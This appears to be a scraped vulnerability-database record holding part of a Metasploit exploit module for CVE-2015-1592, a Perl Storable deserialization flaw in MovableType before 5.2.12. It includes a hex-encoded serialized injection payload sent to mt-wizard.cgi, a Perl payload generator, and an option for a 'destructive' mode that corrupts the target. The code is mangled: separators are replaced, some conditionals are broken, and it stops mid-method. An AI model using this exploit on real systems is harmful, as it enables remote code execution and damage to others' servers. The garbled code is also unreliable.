{
    "text": "vul_name : SixApart MovableType Storable Perl Code Execution ， vul_cve : CVE-2015-1592 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = GoodRanking ， include Msf : Exploit : Remote : HttpClient ， super ( update_info ( info ,  ， 'Name' => 'SixApart MovableType Storable Perl Code Execution' ,  ， 'Description' => %q{ ， This module exploits a serialization flaw in MovableType before 5.2.12 to execute ， arbitrary code. The default nondestructive mode depends on the target server having ， the Object : MultiType and DateTime Perl modules installed in Perl's @ INC paths. ， The destructive mode of operation uses only required MovableType dependencies ,  ， but it will noticeably corrupt the MovableType installation. ， } ,  ， 'Author' => ，  [  ， 'John Lightsey' ,  ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2015-1592' ]  ,  ，  [ 'URL' , ' ]  ,  ，  ]  ,  ， 'Privileged' => false ,  # web server context ， 'Payload' => ， { ， 'DisableNops' => true ,  ， 'BadChars' => ' ' ,  ， 'Space' => 1024 ,  ， } ,  ， 'Compat' => ， { ， 'PayloadType' => 'cmd' ， } ,  ， 'Platform' => [ 'unix' ]  ,  ， 'Arch' => ARCH_CMD ,  ， 'Targets' => [ 'Automatic' , {} ]  ,  ， 'DisclosureDate' => 'Feb 11 2015' ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'MoveableType cgi-bin directory path' , '/cgi-bin/mt/' ]  )  ,  ， OptBool.new ( 'DESTRUCTIVE' ,  [ true , 'Use destructive attack method ( more likely to succeed , but corrupts target system. ) ' , false ]  )  ，  ]  , self.class ， end ， =begin ，  #  ! /usr/bin/perl ，  # generate config parameters for injection checks ， use Storable ;  ， { ， package XCHECKX ;  ， sub STORABLE_thaw { ， } ， sub STORABLE_freeze { ， } ， } ， my $ check_obj = bless { ignore => 'this' } , XCHECKX ;  ， my $ frozen = 'SERG' . pack ( 'N' , 0 ) . pack ( 'N' , 3 ) . Storable : freeze ( { x => $ check_obj} )  ;  ，  $ frozen = unpack 'H * ' ,  $ frozen ;  ， print \"LFI test for storable flaw is :  $ frozen\\n\" ;  ， { ， package DateTime ;  ， use overload '+' => sub { 'ignored' } ;  ， } ， =end ， def check ， vprint_status ( \" # {peer} - Sending storable test injection for XCHECKX.pm load failure\" )  ， res = send_request_cgi ( { ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( target_uri.path , 'mt-wizard.cgi' )  ,  ， 'vars_get' => { ， '_mode' => 'retry' ,  ， 'step' => 'configure' ,  ， 'config' => '53455247000000000000000304080831323334353637380408080803010000000413020b585858434845434b58585801310100000078' ， } ， } )  ， unless res res.code = 200 res.body.include? ( \"Can't locate XCHECKX.pm\" )  ， vprint_status ( \" # {peer} - Failed XCHECKX.pm load test\" )  ; ",
    "time": "2015.05.12"
}